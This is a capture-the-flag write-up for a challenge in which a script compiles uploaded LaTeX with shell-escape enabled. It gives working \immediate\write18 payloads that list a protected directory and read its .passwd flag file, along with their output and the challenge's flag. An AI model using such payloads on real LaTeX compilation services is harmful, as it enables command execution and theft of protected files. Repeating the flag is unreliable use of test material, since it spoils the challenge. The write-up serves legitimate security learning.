---
layout: default
title: LaTeX-Command-Execution
---
We're being given this source code. This is very similar to [LaTeX-Input](LaTeX-Input).

```bash
#!/usr/bin/env bash

if [[ $# -ne 1 ]]; then
    echo "Usage : ${0} TEX_FILE"
fi

if [[ -f "${1}" ]]; then
    TMP=$(mktemp -d)
    cp "${1}" "${TMP}/main.tex"

    # Compilation
    echo "[+] Compilation ..."
    timeout 5 /usr/bin/pdflatex \
        -halt-on-error \
        -output-format=pdf \
        -output-directory "${TMP}" \
        --shell-escape \
        "${TMP}/main.tex" > /dev/null

    timeout 5 /usr/bin/pdflatex \
        -halt-on-error \
        -output-format=pdf \
        -output-directory "${TMP}" \
        --shell-escape \
        "${TMP}/main.tex" > /dev/null

    chmod u+w "${TMP}/main.tex"
    rm "${TMP}/main.tex"
    chmod 750 -R "${TMP}"
    if [[ -f "${TMP}/main.pdf" ]]; then
        echo "[+] Output file : ${TMP}/main.pdf"
    else
        echo "[!] Compilation error, your logs : ${TMP}/main.log"
    fi
else
    echo "[!] Can't access file ${1}"
fi
```

This time, it uses `--shell-esacpe`. So, we can get RCE using [https://gtfobins.org/gtfobins/pdflatex/#shell](https://gtfobins.org/gtfobins/pdflatex/#shell)

This will be our intial payload
```tex
\documentclass{article}
\begin{document}
\immediate\write18{ls -laR /challenge/app-script/ch24/flag_is_here > /tmp/LOL}
\end{document}
```

Now, create temp folder, put the payload inside file and execute the exploit.
Don't forget to change the folder permissions using `chmod . 733`:
```bash
app-script-ch24@challenge02:/tmp/tmp.HiuHR3jj0t$ cat /tmp/LOL
/challenge/app-script/ch24/flag_is_here:
total 12
drwx--x--- 3 app-script-ch24-cracked app-script-ch24 4096 Dec 10  2021 .
drwxr-x--- 3 app-script-ch24-cracked app-script-ch24 4096 Dec 10  2021 ..
drwxr-x--- 2 app-script-ch24-cracked app-script-ch24 4096 Dec 10  2021 512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6

/challenge/app-script/ch24/flag_is_here/512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6:
total 12
drwxr-x--- 2 app-script-ch24-cracked app-script-ch24         4096 Dec 10  2021 .
drwx--x--- 3 app-script-ch24-cracked app-script-ch24         4096 Dec 10  2021 ..
-r-------- 1 app-script-ch24-cracked app-script-ch24-cracked   42 Dec 10  2021 .passwd
```

![Pasted image 20260310212931.png](./images/images/Pasted image 20260310212931.png)

the flag is located at `/challenge/app-script/ch24/flag_is_here/512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6/.passwd`

```tex
\documentclass{article}
\begin{document}
\immediate\write18{cat /challenge/app-script/ch24/flag_is_here/512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6/.passwd > /tmp/LOL}
\end{document}
```

After executing, I read `/tmp/LOL`:
```bash
app-script-ch24@challenge02:/tmp/tmp.HiuHR3jj0t$ cat /tmp/LOL
LaTeX_wr1t3_18_a_us3ful_c0mm4nd_3x3cut10n
```
So, the flag is **LaTeX_wr1t3_18_a_us3ful_c0mm4nd_3x3cut10n**.